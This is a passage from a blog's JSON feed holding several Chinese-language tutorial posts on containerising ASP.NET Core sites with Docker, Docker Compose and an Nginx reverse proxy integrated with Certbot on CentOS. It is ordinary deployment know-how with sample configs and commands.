$proxy_add_x_forwarded_for，透過 HTTP Header 傳遞內容。而 ASP.NET Core 程式也需修改：\n1 2 3 4 5 6 7 public void Configure(IApplicationBuilder app, IHostingEnvironment env) { app.UseForwardedHeaders(new ForwardedHeadersOptions { ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto }); } 不過若 ASP.NET Core 運行於容器，綁定的 IP 不是 127.0.0.1 而是隔離網段 172.1x.0.x IP，此行為打破 UseForwardedHeaders 假設 Request 來自 localhost 的前題，就算設了 ForwardedHeaders， IHttpContextAccessor.HttpContext.Connection.RemoteIpAddress 讀到的仍是 172.1x.0.1 (隔離網段的 Gateway IP)。\n由 ASP.NET Core 的原始碼，檢查規則為若 ForwardedHeadersOptions.KnownNetworks 或 ForwardedHeadersOptions.KnownProxies 有設定，來源 IP 必須要是 KnownNetworks 或 KnownProxies 才會認定請求為 Proxy 轉傳。而 KnownNetworks 及 KnownProxies 預設只有本機 IP。\n1 2 3 4 5 6 7 8 9 10 11 12 13 // ... /// \u0026lt;summary\u0026gt; /// Addresses of known proxies to accept forwarded headers from. /// \u0026lt;/summary\u0026gt; public IList\u0026lt;IPAddress\u0026gt; KnownProxies { get; } = new List\u0026lt;IPAddress\u0026gt;() { IPAddress.IPv6Loopback }; /// \u0026lt;summary\u0026gt; /// Address ranges of known proxies to accept forwarded headers from. /// \u0026lt;/summary\u0026gt; public IList\u0026lt;IPNetwork\u0026gt; KnownNetworks { get; } = new List\u0026lt;IPNetwork\u0026gt;() { new IPNetwork(IPAddress.Loopback, 8) }; // ... 解決方法有兩種，一種是將 172.x.0.0 加入 ForwardedHeadersOptions.KnownNetworks，但網段為 Docker 自由調配，最好寫成自動偵測不宜寫死。\n另一個解法是將 KnownNetworks 與 KnownProxies 都清空，一般有來源 IP 被偽造的風險，但我們 ASP.NET Core 網站架構 Nginx Reverse Proxy 是唯一的入口，故我將其視為可接受做法：\n1 2 3 4 5 6 7 var forwardingOptions = new ForwardedHeadersOptions() { ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto }; forwardingOptions.KnownNetworks.Clear(); //its loopback by default forwardingOptions.KnownProxies.Clear(); app.UseForwardedHeaders(forwardingOptions); 參考：\n记录Docker部署asp.net core应用时使用反向代理的坑 IIS Reverse Proxy 後 RemoteIpAddress 取值錯誤 Stackoverlow 討論 Nginx 內容壓縮問題 跑了一陣子才發現，我用的 Nginx + Certbot 容器的 Nginx 設定檔 /etc/nginx/nginx.conf 預設未開啟 GZIP 壓縮。\n我的解法是新增 Volume 對映將 /etc/nginx/nginx.conf 對應到 Host /etc/nginx/nginx.conf，並修改增加 gzip 那段內容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 user nginx; worker_processes 1; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; gzip on; gzip_min_length 1000; gzip_buffers 4 16k; gzip_comp_level 5; gzip_types text/plain application/x-javascript text/css application/xml text/javascript; include /etc/nginx/conf.d/*.conf; } Nginx 壓縮設定的意義可參考官方文件\n","date":"2022-12-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-09/dotnet-core-docker-note-4/","title":"ASP.NET Core Docker 筆記 4 - ASP.NET Core 網站容器化經驗分享"},{"content":" 參考網站\n前言 前篇文章介紹過使用 Docker Compose 設定關聯容器(Web、DB、Reverse Proxy)組成系統，容器被隔離在專用網段(Compose 自動建立的 Bridge)，並可透過容器名稱彼此溝通，Compose 也確保相關服務一起啟動一起關閉，是用多個容器建構系統最簡便的做法。\n註：關於容器管理 Kubernetes，K8S 提供更強大的功能，支援 Cluster 高可用架構 (單一容器、主機掛掉系統不會死)，為當今在雲端掛載容器以及中大型企業實做容器架構的主流，K8S 無疑可取代 Docker Compose，但其複雜性較高。 目前我在單一 Linux 機跑 Docker 還用不到牛刀(雖然有單機版 Minikube 可用)，未來若要將 Docker 應用於工作，K8S 已成必要技能。\n用 Docker Compose 組合容器建立服務看似完美，但應用在 Reverse Proxy (Nginx) 時需要額外考量。\n我打算在同一台 Linux 上跑多個網站，對外用同一個 IP，再依 HTTP Request 的 Host 標頭導向不同網站。\n舉例 舉個例子：假設 Linux 的對外 IP 是 123.123.123.123，我申請兩個 DNS 名稱 web1.xxx.com.tw、web2.xxx.com.tw 都指向 123.123.123.123。\n使用者用 http://web1.xxx.com.tw 連上 123.123.123.123 的 80 Port 時，Reverse Proxy 導向 Web1 網站；用 http://web2.xxx.com.tw 時連線時則導向 Web2 網站。由於對外靜態 IP 為珍貴資源，多網站透過 Host 共用 IP 是節省成本的常見做法。\n上述以 HTTP Host 名稱導向的做法，若用 Docker Compose 將網站連同 Reverse Proxy 包在一起，就可能出問題。\n例如：某 Host OS 跑兩個網站，若各自用 Docker Compose 連同 Nginx 一起包進去，網站 A 由 Web-A + MySQL-A + Nginx-A 組成，網站 B 由 Web-B + MySQL-B + Nginx-B 組成，二者跑在自己的專屬網段，僅 Nginx-A 跟 Nginx-B 對映到 Host OS IP 的 80 Port\u0026hellip; 哦哦，衝突出現了，Nginx-A 與 Nginx-B 都需對映 Host IP 的 80 Port，但 Host OS 的 80 Port 只允許被一個程序使用。\n解決方式 有幾個解決方向：\nNginx-A 與 Nginx-B 各自對應到主機不同 Port，更前端再掛一台 Nginx 聽 80 Port，依 Host Name 導向到 Nginx-A 與 Nginx- B，如此 Nginx-A 與 Nginx-B 的角色顯得多餘，多了一次轉接但未看到明顯效益，徒增複雜性又耗損效能。\n將兩個系統包成一個大 Docker Compose，Web-A + MySQL-A + Web-B + MySQL-B + Nginx，共用 Nginx 可避免 Port 80 繫結衝突，但將不相關系統綁架成一團，被迫一起啟動一起停止挺鳥的，更不用提一旦加跑新服務就要改 Docker Compose，我覺得不行。\n將 Nginx 從 Docker Compose 抽離，讓 Web-A 與 Web-B 對映到 Host IP 的不同 Port，整個 Host OS 只跑一份 Nginx 聽 80 Port，依 Host Name 分派給網站 A 或網站 B。也就是用 Docker Compose 執行三個容器：\nWeb-A + MySQL-A Web-B + MySQL-B Ngnix 3 是我認為較可行且有效率的做法。\nNginx 包容器的做法在第一篇筆記已提過，這次我們將重點放在整合 Certbot 及 docker-compose.yml 定義。\n原本想抓 Nginx 的 Docker Image 自行加裝 certbot 實現自動安裝與更新 Let\u0026rsquo;s Encrypt SSL 憑證。\n用 Docker 的好處是資源豐富，很快在網路上找到現成解決方案，超級好用的全自動化 Nginx + Certbot -\u0026gt; staticfloat/nginx-certbot。\nstaticfloat/nginx-certbot staticfloat/nginx-certbot\n使用方法很簡單，在 /etc/nginx/conf.d 放一個 certbot.conf 接受 80 Port 流量，只用於接收 Let\u0026rsquo;s Encrypt 的 /.well-known/acme-challenge 要求導向 Certbot 完成自動驗證，其餘則一律導向 HTTPS：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 server { # Listen on plain old HTTP listen 80 default_server; # Pass this particular URL off to certbot, to authenticate HTTPS certificates location \u0026#39;/.well-known/acme-challenge\u0026#39; { default_type \u0026#34;text/plain\u0026#34;; proxy_pass http://localhost:1337; } # Everything else gets shunted over to HTTPS location / { return 301 https://$http_host$request_uri; } } 接著在 /etc/nginx/conf.d 為每個網站新增一個 someweb.conf 承接 HTTPS 請求。server_name 註明該網站綁定的 Host 名稱(DNS 名稱)，ssl_certificate、ssl_certficate_key 則指向 /etc/letsencrypt/live/DNS名稱 的 fullchain.pem 及 private.pem，這兩個檔案不需事先準備，Certbot 會自動產生，至於 proxy_* 相關設定比照先前介紹過的做法。完整範例如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 server { listen 443 ssl; server_name blog.darkthread.net; ssl_certificate /etc/letsencrypt/live/blog.darkthread.net/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/blog.darkthread.net/privkey.pem; location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 這個 Docker Image 有一段精巧設計，它在啟動時會主動掃瞄 /etc/nginx/conf.d 下的 config，一旦偵測缺少 /etc/letsencrypt/live/*/fullchain.pem 就連上 Let\u0026rsquo;s Encrypt 網站進行驗證下載 SSL 憑證，另外還設了每週一次的排程，憑證到期前會自動更新，一氣喝成，全不沾手，貼心到我想起立鼓掌。\n若對它的運作原理有興趣，Github 有原始碼可以參考。\n為了瞭解原理，我是依著 Github 原始碼自己跑 Dockerfile 製作 Nginx + Certbot 的 Image，如果嫌麻煩，直接從 Docker Hub 下載也成。\n以下是我的 Nginx docker-compose.yml：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 version: \u0026#34;3\u0026#34; services: nginx: image: nginx-certbot container_name: nginx ports: - 80:80 - 443:443 volumes: - /var/log/nginx:/var/log/nginx - /etc/nginx/conf.d:/etc/nginx/conf.d - /etc/letsencrypt:/etc/letsencrypt restart: always environment: - CERTBOT_EMAIL=your-email@mail.com network_mode: \u0026#34;host\u0026#34; 我設了三個 Volume 對映：\n/var/log/nginx：Log 檔 /etc/nginx/conf.d：設定檔 /etc/letsencrypt：用來存放 SSL 憑證 若為 SELinux 記得要 chcon -Rt 參考，另外 network_mode 指定 host 表示 Nginx 容器將直接使用 Host OS 網段，不另設 Bridge。\n參考：Docker Compose 鏈接外部容器的幾種方式\n就醬，Nginx Reverse Proxy 準備好了，下一篇來再來分享我將 ASP.NET Core 搬進 Docker 的經驗。\n","date":"2022-12-08T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-08/dotnet-core-docker-note-3/","title":"ASP.NET Core Docker 筆記 3 - 共用 Nginx 容器與 Certbot 整合"},{"content":" 參考網站\n參考網站\n上篇文章體驗過在 CentOS 用 Docker Container 分別跑 Nginx 跟 ASP.NET Core 網站，並建立 Reverse Proxy 關係，接著探討在實務上當需要多個 Container 協同運作時應如何規劃整合。\n一個系統常可再拆解成多個服務。以線上購物網站為例，就可能是由 ASP.NET Core 網站(Kestrel)、MySQL 資料庫、Reverse Proxy、金流 Gateway\u0026hellip; 等多個服務組成，若要以 Docker Container 實現，有幾種策略：\n策略 1. 全部裝在單一 Container 撰寫一個 Dockerfile，以 MySQL 資料資料庫為基底，在上面安裝 ASP.NET Core Runtime、Nginx 組裝合成獸。\n好處是一個 Container 搞定，高內聚低耦合，不會因相依服務沒配置好或未啟動而故障。但缺點挺明顯：\n某些 Container Image 為求輕巧作業系統層次的工具、程式庫很精簡(例如：Nginx Container 連 ping 都沒有)，只求目標程式能執行就好，要加裝其他軟體時要點技巧，得多花些心思。 全部綁在一起便失去動態調配的彈性，例如：當前端 Web 負載過高時，擴充不易。 當需要個別升級資料庫、ASP.NET Core 版本，或是想抽換服務組合時手續複雜，有違模組化精神。 2. 以個別 Container 執行，獨立控制 如同前篇文章的做法，ASP.NET Core 網站跑 Cotainer 繫結到 Host OS 的 5000 Port，用 Container 跑 MySQL，再用 Container 跑 Ngnix 繫結到 Host OS 80 Port，再設定 Reverse Proxy 規則。\nContainer 間串接配置全靠人工，系統管理員需協助哪個 Container 聽哪個 Port，確保彼此不衝突。如此做有兩個缺點：\n相依服務的啟動狀態未連動，需靠人為控制確保先啟動資料庫 Container 再啟動網站 Container 的順序。 若 Host OS 跑多個系統都用到 MySQL，系統管理員需協調 TCP Port 不衝突，Docker 的 Bridge (橋接器)隔離網段機制全無用武之地。 3. 以個別 Container 執行，但使用 Docker Compose 關聯 為滿足多 Container 協同作業需求，Docker Compose 應運而生。\nDocker Compose 定義了一套宣告語法(採用 YAML 格式)，在其中定義各服務 Container 的啟動參數、與 Host OS Port 對映、隸屬 Bridge 網段、Volume 資料夾/檔案對應等等。\nDocker Compose 會自動為 Container 建立隔離網段並設好名稱解析，讓 Container 使用容器名稱解析成 IP 找到其他 Container，因此設定連線字串或 URL 時便可寫成 httq://myweb:5000、mongodb://mydb，清楚又方便。\n最重要是透過 docker-compose up/down 指令可以一次啟動或停用相關服務，Docker Compose 還會依據相依 depends_on 指定關聯先啟動 DB 再啟動 Web，先關閉 Web 再關閉 DB，便利性讓人工操作望塵莫及。\n參考：Docker Compose 初步閱讀與學習記錄\n實例 針對上述三種做法，以 ASP.NET Core + Ngninx 為題，對映到以下實例：\n1. 安裝成單一 Container 以 ASP.NET Core Image 為基底，安裝 Nginx，設定 nginx.conf，複製 ASP.NET Core 網站檔案並設定 service nginx start 及 dotnet /app/web.dll 分別啟動 Nginx 及 Kestrel。\n細節做法可參考這篇文章：Nginx Reverse Proxy to ASP.NET Core – Same Docker Container\n不過，該文用的 ASP.NET Core 版本偏舊，若為 ASP.NET Core 2.1 包成 Docker Container 的做法請參考前文\n2. ASP.NET Core、Nginx 各自跑 Container 就是我們在前篇文章採行的方式，但有一點要補充，除了直接對映到 Host OS IP 的 TCP Port，也可考慮自訂 Bridge，讓 Container 在隔離網段內溝通，例如：ASP.NET Core 的 5000 Port 只有 Nginx 看得到，從 Host OS 無法存取，如此可避免網路介面(網站、資料庫\u0026hellip;)外露到 Host OS，減少被攻擊的風險，這部分後面再找時間介紹。\n3. 使用 Docker Compose 串連 ASP.NET Core 與 Nginx 各有自己的容器，使用 Docker Compose 組合串連，一次啟動兩個服務。\n細節做法可參考這篇文章：Nginx Reverse Proxy to ASP.NET Core – Separate Docker Containers\n綜合以上分析，Docker Compose 無疑是整合關聯 Container 較佳的方式。\n練習 光說不練是假把式，寫技術文沒實作感覺怪怪的，來個 Docker Compose 練習好了。手邊沒有 ASP.NET Core + DB Server 的範例，就用 Docker 可以找到的 Image 當題材(也方便大家實地驗證)，試試用 Container 跑 Wekan 看板系統。Wekan 在 Node.js 執行，另外需要 MongoDB，這個練習會用 Docker Compose 組合兩個 Container 架設看板網站。\n開始前，記得先安裝 Docker Compose，如果發生 sudo docker-compose 找不到指令，要再加上 sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose 參考。\n要使用 Docker Compose 很簡單，說穿了就是將 Container 設定寫成 docker-compose.yml，寫好寫對再呼叫 docker-compose up -d 即大功告成。以 Wekan 為例，docker-compose.yml 如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 version: \u0026#39;3\u0026#39; services: wekan: image: wekanteam/wekan:latest depends_on: - wekandb environment: - MONGO_URL=mongodb://wekandb/wekan - ROOT_URL=http://localhost:80 ports: - 80:8080 wekandb: image: mongo:3.2.14 volumes: - /var/www/wekan/db:/data/db 在這個 YAML 裡，我定義了兩個 Service Container，分別叫 wekan 及 wekandb。\nWekan Container Image 來自 wekanteam/wekan 最新版，depends_on 宣告 wekan 依賴 wekandb，故 Docker Compose 會先啟動 wekandb 再啟動 wekan。\nMONGO_URL、ROOTL_URL 為環境變數，其中 MONGO_URL 寫成 mongodb://wekandb/wekan，docker-compose.yml 所定義的各 Container 預設隸屬同一個 Bridge 網段，彼此可用機器名稱解析。\nWekan 網站在 Container 掛在 8080 Port，透過 ports 80:8080 會將其對映到 Host IP 80 Port。\nwekandb Container 則以 Mongo DB Container Image 為基底，資料庫檔案以 Volume 方式對映到 Host OS /var/www/wekan/db 資料夾。\n這裡補充一個眉角，由於 SELinux 資安管控較嚴，在 CentOS/REHL/Fedora 版 Linux 上 Docker Container 讀取 Volume 對映資料夾可能會出現 permission denied 錯誤，需對該資料夾執行 chcon -Rt svirt\\_sandbox\\_file\\_t /var/www/wekan/db 調整權限，或在目錄名稱後方加上 :Z 由 Docker 自動執行。\n參考：Using Volumes with Docker can Cause Problems with SELinux\n寫好 docker-compose.yml，執行 sudo docker-compose up -d，Docker Compose 依序帶起 weknadb、wekan 兩個容器，Wekan 看板已在 Host OS 80 Port 運行成功。\n最後補充一點，前面提到 Docker Compose 會為整組 Container 建立專屬 Bridge，上圖一開始的 Create network \u0026ldquo;wekan_default\u0026rdquo; with the default driver 訊息就是證明。\n執行 docker network ls，可看到 wekan_default 是個 bridge，執行 docker inspect wekan_default 則可進一步看到這個網段為 172.18..，而兩個 Container 的 IP 分別為 172.28.0.3 及 172.28.0.2。\nDocker Compose 非常適合用來組裝 Web、DB 等多個 Container 構建系統，但我發現針對 Nginx 時有些額外考量，這部分留待下集分解。\n","date":"2022-12-07T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-07/dotnet-core-docker-note-2/","title":"ASP.NET Core Docker 筆記 2 - 組合容器建構系統"},{"content":" 參考網站\n參考網站\n前面研究過在 CentOS 安裝及設定 ASP.NET Core + Nginx，習得徒手在 CentOS 安裝部署伺服器的技能，依循 Roadmap 來到下一階段 - 學習使用 Docker 簡化部署。\n容器化及 Docker 這幾年熱到發燙，有些人甚至認為它已在軟體產業掀起一波革命。(我親身體驗的感想也是：Wow! 難怪會爆紅) 此刻才起步已算遲了，但也不是沒有好處，晚起鳥兒有更多蟲可以吃，Docker 相關的文章資源多如牛毛，這裡便不多花篇幅贅述觀念與基本操作，只簡單整理我對 Docker 的理解。\nDocker 相關介紹 Container Container (容器)可以想成極度輕量化的虛擬機器(Virtual Machine)，用法及優點與 VM 相同，能在一台 Host OS 同時運行多個彼此隔離的應用程式環境，但差別在 Container 會共用底層 Host OS，相較 VM 需各跑一份 Guest OS 能省下可觀的記憶體、磁碟，因此 Container 多了啟動速度快，耗用資源少(與直接跑應用程式相去不遠)的優勢。\n一台 4GB RAM 的機器頂多跑 2 - 3 台 VM 就緊繃了，但執行數十上百個 Container 不是問題。\n2 Container 跟 VM 一樣具有很好的隔離效果，每個 Container 有自己的獨立作業環境(記憶體、磁碟空間、網路)，不會彼此干擾，不必擔心 Container A 改系統設定害 Container B 跑不起來，或是兩個 Container 互相搶奪 80 Port，拿到 Image 就一定能在自己的機器跑起來。\nContainer 在這方面的特性與 VM 完全相同，但因為不用包入作業系統，體積縮小許多，耗用記憶體也少，但便利性完全不減，取得 Container Image，靠一行指令幾秒內就能在機器把程式跑起來。\nDocker Hub Docker Hub 上有超過 10 萬個 Container Image，從 PHP、Node,js、Apache、MySQL、Mongo DB、Nginx、Redis、ASP.NET Core\u0026hellip; 幾乎想得到的都有，下指令自動下載 Image，幾秒鐘就裝好一台 DB、Web 伺服器，再下個指令又裝好第二台，不用擔心跟作業系統不相容、與其他軟體相衝、系統環境有誤導致安裝失敗，這就是 Docker 最迷人的所在。\n而我們也可將自己的專案網站做成 Image，交給測試人員測試，交付 OP 幾秒部署上線，也能將做好的 Image 上傳到 Docker Hub 與全世界分享。\nDocker Container Docker Container 起初是基於 Linux Container 技術，故在 Container 只能跑 Linux 平台應用程式，雖然在 Windows 也有 Docker for Windows，但背後是用 Hyper-V 跑 Linux 虛擬機執行 Docker Engine 再跑 Docker Container。\n後來微軟也依循相同概念發展出 Windows Container，並融入 Docker 體系，自此 Docker Container 開始有 Linux Container、Windows Container 之分，Windows Container 裡跑的就是不折不扣的 Windows 程式。\n參考：安裝 Docker 容器環境 - Windows Server 2016\n從此，在 Container 裡跑 ASP.NET WebForm不再是夢。\nWindows Container Windows Container 問市後，ASP.NET Core 程式容器化有 Linux Container 與 Windows Container 兩種選擇。\n基於 Linux Container 資源數量上的優勢，加上耗用資源較少，軟硬體成本低，我選擇 Linux Container。\n雖然 Container 間共用底層作業系統，Docker Engine 為容器中的應用程式提供隔離不受干擾的空間（記憶體、檔案系統、網路 Port）。\n例如：容器 A 寫入 /etc/aaa/default.conf 不影響容器 B /etc/aaa/default.conf 的內容、容器 A 與容器 B 都繫結到 80 Port 也不會衝突。\n先前文章提過將 Kestrel 轉為 Linux 服務、設定 www-data 執行權限\u0026hellip; 等步驟，改用 Docker 後簡單很多，生命週期由 Docker 控制，在容器內部權限一律為 root 不需額外規劃權限，直接跑 dotnet WebApp.dll 聽 5000 Port 就好。\n參考資料：\n10個Q\u0026amp;A快速認識Docker 《Docker —— 從入門到實踐­》正體中文版 Docker 入门教程 by 阮一峰 練習 Docker 安裝與基本操作的參考資料很多，這裡不多介紹，直接來幾個練習暖身：在 CentOS 上用 Docker 下載現成 Conatiner Image 執行 Nginx 伺服器，再用預設專案範本建立 ASP.NET Core 網站並包進 Container 執行。最後將二者串接在一起，使用 Nginx 做為 ASP.NET Core 網站的 Reverse Proxy。\n執行 Nginx Container 執行 Nginx Container\n1 sudo docker run --name mynginx -d -p 80:80 --rm nginx 不誇張，真的只要這行 Nginx 就好了。\n-d：把 Container 丟到背景執行不要佔用命令列視窗 -p 80:80：表示將 Container 的 80 Port 對應到 Host OS 的 80 Port --rm：表示 Container 停止時自動刪除。 開個 Chrome 連上 Host OS 的 80 Port，Nginx 已經準備就緒！\n註：docker 指令需繫結 Unix Socket，必須以 SuperUser 權限執行，將使用者加入 Docker 群組可省去每次加 sudo 的麻煩。參考：Manage Docker as a non-root user\n1 2 sudo groupadd docker sudo usermod -aG docker $USER 但這招在 CentOS/Fedora/RHEL 不管用!，但有替代方案：在 /etc/sudoers 加入 yourUserAccount ALL=(ALL) NOPASSWD: /usr/bin/docker 開放 sudo docker 時不用敲密碼，再用 alias docker=\u0026quot;sudo /usr/bin/docker\u0026quot; 建立同義詞，也可做到不必 sudo 敲密碼跑 docker 指令。\n將 ASP.NET Core 專案包進 Container 將 ASP.NET Core 專案包進 Container 使用 .NET Core CLI 建立 MVC 專案，修改 Startup.cs 取消 app.UseHttpsRedirection()，以 Kestrel 執行 ASP.NET Core 網站。\n1 2 3 4 dotnet new mvc sed -i -e \u0026#39;s/app.UseHttps/\\/\\/app.UseHttps/\u0026#39; Startup.cs dotnet publish dotnet bin/Debug/netcoreapp2.1/web.dll 由於 5000 Port 預設不對外開放，懶得開防火牆，在本機用 curl httq://localhost:5000 驗證網站運行中。\n驗證程式可執行後，寫個 Dockerfile 腳本將程式封裝成 Docker Image，這部分細節可參考保哥的文章：如何將 ASP.NET Core 2.1 網站部署到 Docker 容器中。\n在實務環境可以設計成全自動化測試流程，到版控抓原始碼放進內含 .NET Core SDK 的 Container 編譯，將結果包成只有 .NET Core Runtime 的 Container Image，用它建立 Container 進行 E2E 測試，一切自動化。這裡為求簡便，我選擇用只有 Runtime 的 Container Image 當成基底，將在 Host OS 編譯好的檔案複製到 Container /app 目錄，Dockerfile 內容如下：\n1 2 3 4 FROM microsoft/dotnet:2.1-aspnetcore-runtime WORKDIR /app COPY ./bin/Debug/netcoreapp2.1 ./ ENTRYPOINT [\u0026#34;dotnet\u0026#34;, \u0026#34;web.dll\u0026#34;] 做好 Dockerfile 後執行 docker build，Docker 會從 Docker Hub 下載 microsoft/dotnet:2.1-aspnetcore-runtime (microsoft/dotnet 是 Image 名稱，同一 Image 常有多種版本可選擇，:2.1-aspnetcore-runtime 是標籤可用來指定版本)，-t 參數指定 Image 名稱為 testapp。\nContainer Image 做好後接著用 docker run -d --rm --name myapp -p 5000:80 testapp 用剛做好的 Image 建立 Container，ASP.NET Core 專案在 Container 執行時，預設聽 80 Port，故我們用 -p 5000:80 將 Container 的 80 Port 導向 Host OS 的 5000 Port。用 curl 驗證網站運行中。\n使用 docker images 及 docker ps 我們可以看到剛才建立的 Image testapp 及 Container myapp：\n將 Nginx 設成 ASP.NET Core 網站的 Reverse Proxy 至此，我們做了兩個 Container，myginx 聽 Host OS 80 Port，myapp 聽 Host OS 的 5000 Port，下一步要將 Nginx 設成 ASP.NET Core 網站的 Reverse Proxy。\n做法跟先前文章介紹過的概念差不多，為求簡便我們直接修改 conf.d/default.conf 將進入 80 Port 的請求導向 5000 Port。(正規做法建議一個網站開一個 conf 檔) Container 的檔案系統是隔離的，將設定檔保存在 Container 裡不是好主意 - 除非每次修改設定存檔就重新產生 Image 並要求未來一律改用新版 Image 建立 Container，否則一旦 Conatiner 被刪除，設定就會消失。同樣問題也會發生在資料庫檔、Log 檔等執行期間要動態更新的內容，這類檔案保存在 Host OS 檔案系統上比較合理，程式換版換了 Container Image 資料才不受影響。Docker 靠 Volume 解決資料保存及共用需求，docker run 有個 -v host-path:container-path 可將 Host OS 特定目錄或檔案對映到 Container，讓 Container 能讀寫 Host OS 的檔案。\n對 Nginx Container 來說，Reverse Proxy 設定放在 /etc/nginx/conf.d，我選擇在 Host OS 也建立相同路徑並將 Container 的 default.conf 複製出來(指令如下)，修改後在 docker run 加上 -v /etc/nginx/conf.d:/etc/nginx/conf.d 對映回去：\n1 sudo docker cp mynginx:/etc/nginx/conf.d /etc/nginx/conf.d 修改 /etc/nginx/conf.d/default.conf，目前是將進入 Nginx 80 Port 的請求導向 Host OS 5000 Port，但從 Docker Container 存取 Host OS IP 有些眉角，Mac 或 Windows Docker 18.3+ 可用 DNS 名稱 host.docker.internal 指向 Host OS IP，但 Docker for Linux 18.4+ 這招己失效。參考\n省事做法是 docker run 時用 --network host 讓 Container 直接繫結本機 IP 而非 Docker 所屬的隔離網段，如此 default.conf 的 proxy_pass 指向 localhost:5000 即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 server { listen 80; server_name localhost; #charset koi8-r; #access_log /var/log/nginx/host.access.log main; location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 完整啟動指令如下：\n1 sudo docker run --name mynginx -d -v /etc/nginx/conf.d:/etc/nginx/conf.d --network host nginx 從遠端開啟 Chrome 連上 Host OS 的 80 Port，我們已被順利導向 ASP.NET Core 網站，顯示設定成功。\n經過以上練習，我們體驗了從 Docker Hub 下載 Image 建立 Docker Containter 跑 Nginx、用 Dockerfile 將 ASP.NET Core 網站包成 Container、用 Port 映對 Host OS TCP Port 到 Container、使用 -v(\u0026ndash;volume) 映對資料夾讓 Container 讀寫 Host OS 檔案。\n而在實務應用上，相關的 Conatiner 需要組合在一起執行，例如一個 Container 跑網站，一個 Container 跑資料庫，此時可用 docker-compose 簡化管理；另外 Docker 也提供 Bridge 為相關 Container 建立專屬的隔離網段，防止外界接觸到不想對外公開的網路服務，也避免不相干的 Container 彼此干擾\u0026hellip; 這些議題就留待下一篇文章討論。\n","date":"2022-12-06T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-06/dotnet-core-docker-note-1/","title":"ASP.NET Core Docker 筆記 1 - 初探"},{"content":" 參考網站\nASP.NET Core 內建的 Kestrel 伺服器輕巧但功能陽春，實務上需搭配 Reverse Proxy 對外提供服務，Linux 有兩大 Reverse Proxy 選擇：Apache 及 Nginx，這邊筆記一下使用這幾年如日中天的 Nginx。\n相較於 Apache、lighttpd，Nginx 標榜單一執行緒、記憶耗用少、穩定性高，強調效能取向，在熱門網站間獨霸一方(參考：維基百科)，與強調效能的 ASP.NET Core 搭配，相得益彰。\n以下是我的 CentOS Nginx 安裝設定筆記：\n安裝 Nginx。參考：How To Install Nginx on CentOS 7 1 2 sudo yum install epel-release sudo yum install nginx 發現 CentOS 預設沒裝 telnet 客戶端，檢測查修不便，安裝一下 telnet： 1 sudo yum install telnet 啟動 Nginx 1 sudo systemctl start nginx 啟動後 telnet localhost 80 如有連上就是成功了。如從外部連不上多是防火牆緣故，需額外設定：\n1 2 3 sudo firewall-cmd --permanent --zone=public --add-service=http sudo firewall-cmd --permanent --zone=public --add-service=https sudo firewall-cmd --reload 設好防火牆，從 Windows 開 Chrome 連上 CentOS 主機 80 Port，如果看到 Nginx 歡迎網頁即代表大功告成。\nASP.NET Core 文件有詳細的Nginx 設定教學，做法是直接修改 /etc/nginx/nginx.conf，在 http 區塊加入 server 設定。 但較模組化的做法是為每個站台寫獨立 conf 檔放在 /etc/nginx/conf.d 下。例如：/etc/nginx/conf.d/default.conf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 server { listen 80; server_name linux.darkblog.net; #測試用的自訂網域名稱 location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 設定完畢先用 sudo nginx -t 測試設定檔有沒有被改壞，若 OK 就執行 sudo nginx -s reload 重新載入。\n試連時我遇到 502 Bad Gateway 錯誤： 1 2 2018/09/24 15:37:53 [crit] 60137#0: *7 connect() to 127.0.0.1:5000 failed (13: Permission denied) while connecting to upstream, client: 192.168.50.159, server: linux.darkblog.net, request: \u0026#34;GET / HTTP/1.1\u0026#34;, upstream: \u0026#34;http://127.0.0.1:5000/\u0026#34;, host: \u0026#34;linux.darkblog.net\u0026#34; 2018/09/24 15:37:53 [error] 60137#0: *7 no live upstreams while connecting to upstream, client: 192.168.50.159, server: linux.darkblog.net, request: \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34;, upstream: \u0026#34;http://localhost/favicon.ico\u0026#34;, host: 